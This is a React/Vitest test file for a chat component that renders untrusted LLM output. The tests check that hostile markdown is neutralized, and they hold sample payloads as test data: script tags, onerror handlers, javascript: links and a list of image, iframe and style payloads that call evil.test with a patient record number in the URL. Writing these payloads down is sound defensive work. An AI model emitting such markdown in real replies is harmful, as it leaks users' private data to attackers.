import { fireEvent, render } from "@testing-library/react";
import { describe, expect, it, vi } from "vitest";
import { Response } from "./response";

/**
 * The Response component renders LLM output through Streamdown, and that
 * output is untrusted (WP14 item 2: page/peer/log text can end up quoted
 * back into an assistant message, and a compromised or confused model
 * could itself emit hostile markdown). Streamdown's `linkSafety` defaults
 * to `{enabled: true}` and its default rehype pipeline is documented to
 * strip raw HTML/neutralize `javascript:` links, but that's a claim about
 * the library, not this integration — these tests verify the actual
 * rendered DOM here, in this app, rather than trusting the default.
 */
describe("Response — untrusted markdown is neutralized", () => {
  it("never executes or renders a raw <script> tag", () => {
    const { container } = render(
      <Response>
        {"Look at this: <script>window.__pwned = true;</script>"}
      </Response>,
    );

    expect(container.querySelector("script")).toBeNull();
    expect(
      (window as unknown as { __pwned?: boolean }).__pwned,
    ).toBeUndefined();
  });

  it("never renders an inline event handler attribute from raw HTML", () => {
    const { container } = render(
      <Response>{'<img src="x" onerror="window.__pwned = true">'}</Response>,
    );

    const img = container.querySelector("img");
    if (img) {
      expect(img.getAttribute("onerror")).toBeNull();
    }
    expect(
      (window as unknown as { __pwned?: boolean }).__pwned,
    ).toBeUndefined();
  });

  it("never produces a javascript: href anywhere in the rendered output for a javascript: link", () => {
    const { container } = render(
      <Response>{"[click me](javascript:alert(1))"}</Response>,
    );

    // Streamdown's linkSafety renders every link as a button gated behind a
    // confirmation dialog rather than a bare <a href> (see below) — the
    // property that actually matters is that the raw javascript: URL never
    // ends up in an attribute a browser would act on unprompted.
    for (const el of container.querySelectorAll("*")) {
      for (const attr of el.getAttributeNames()) {
        expect(el.getAttribute(attr)).not.toMatch(/^javascript:/i);
      }
    }
  });

  it("gates every rendered link behind a confirmation click — it never becomes a directly-navigable <a href>, and clicking it alone never navigates", () => {
    const openSpy = vi.spyOn(window, "open").mockImplementation(() => null);
    const { container } = render(
      <Response>{"[Apty](https://apty.ai)"}</Response>,
    );

    // linkSafety renders links as buttons, not raw anchors — the real URL
    // is never exposed as a directly-clickable/navigable href.
    expect(container.querySelector("a[href]")).toBeNull();
    const linkButton = container.querySelector('[data-streamdown="link"]');
    expect(linkButton).not.toBeNull();
    expect(linkButton?.tagName).toBe("BUTTON");

    fireEvent.click(linkButton as Element);

    // A single click must not have navigated — it only opens a
    // confirmation dialog (no onLinkCheck is configured, so every link
    // requires an explicit second, confirming action first).
    expect(openSpy).not.toHaveBeenCalled();
  });

  it("renders plain text content without throwing on markdown-special characters", () => {
    expect(() =>
      render(
        <Response>{"1 < 2 && 3 > 1 // not markdown, just text"}</Response>,
      ),
    ).not.toThrow();
  });
});

const ATTACKER = "https://evil.test/leak.png?d=PATIENT-MRN-123";

function attributesLoadingAttacker(root: ParentNode): string[] {
  const hits: string[] = [];
  for (const el of root.querySelectorAll("*")) {
    for (const attr of el.getAttributeNames()) {
      if (el.getAttribute(attr)?.includes("evil.test")) {
        hits.push(`<${el.tagName.toLowerCase()} ${attr}>`);
      }
    }
  }
  return hits;
}

describe("Response — model output never loads a remote resource", () => {
  const cases: Array<[string, string]> = [
    ["markdown image", `![chart](${ATTACKER})`],
    ["reference-style image", `![chart][r]\n\n[r]: ${ATTACKER}`],
    ["raw <img src>", `<img src="${ATTACKER}" alt="x">`],
    ["raw <img srcset>", `<img srcset="${ATTACKER} 1x" alt="x">`],
    [
      "raw <picture><source>",
      `<picture><source srcset="${ATTACKER}"><img src="${ATTACKER}"></picture>`,
    ],
    [
      "raw <video poster>",
      `<video poster="${ATTACKER}" src="${ATTACKER}"></video>`,
    ],
    ["raw <audio src>", `<audio src="${ATTACKER}"></audio>`],
    [
      "raw <link rel=preload>",
      `<link rel="preload" as="image" href="${ATTACKER}">`,
    ],
    ["raw <iframe>", `<iframe src="${ATTACKER}"></iframe>`],
    ["raw <object>", `<object data="${ATTACKER}"></object>`],
    ["inline style url()", `<div style="background:url(${ATTACKER})">x</div>`],
    ["raw <style>", `<style>body{background:url(${ATTACKER})}</style>`],
  ];

  it.each(
    cases,
  )("%s produces no element that would load the URL", (_name, md) => {
    const { container } = render(<Response>{md}</Response>);
    expect(attributesLoadingAttacker(container)).toEqual([]);
    expect(attributesLoadingAttacker(document.head)).toEqual([]);
    expect(document.querySelector('link[rel="preload"]')).toBeNull();
    expect(container.querySelector("style")).toBeNull();
  });

  it("shows a blocked remote image as plain text naming the image", () => {
    const { container } = render(
      <Response>{`![chart](${ATTACKER})`}</Response>,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.textContent).toContain("chart");
  });

  it("renders a local data: image, which is how the chat shows its own screenshots", () => {
    const dataUrl =
      "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=";
    const { container } = render(<Response>{`![dot](${dataUrl})`}</Response>);
    expect(container.querySelector("img")?.getAttribute("src")).toBe(dataUrl);
    expect(container.textContent).not.toContain("Image blocked");
  });

  it("never renders a data: URL that is not an image", () => {
    const { container } = render(
      <Response>
        {"![x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)"}
      </Response>,
    );
    expect(container.querySelector("img")).toBeNull();
  });
});
